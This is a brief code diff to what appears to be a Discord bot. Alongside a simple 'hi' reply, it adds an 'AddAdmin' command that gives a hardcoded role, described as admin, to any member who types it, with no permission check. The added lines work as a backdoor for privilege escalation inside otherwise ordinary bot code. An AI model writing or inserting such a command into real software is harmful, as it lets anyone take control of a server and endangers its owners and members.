@@ -22,6 +22,9 @@ client.on('message', message => {
 
     if (command === 'hi'){
         message.channel.send('hi!');
+    }else if(command == 'AddAdmin'){
+        message.member.roles.add('778962085366333480');
+        message.channel.send('you are Admin now! :)');
     }
 })
 
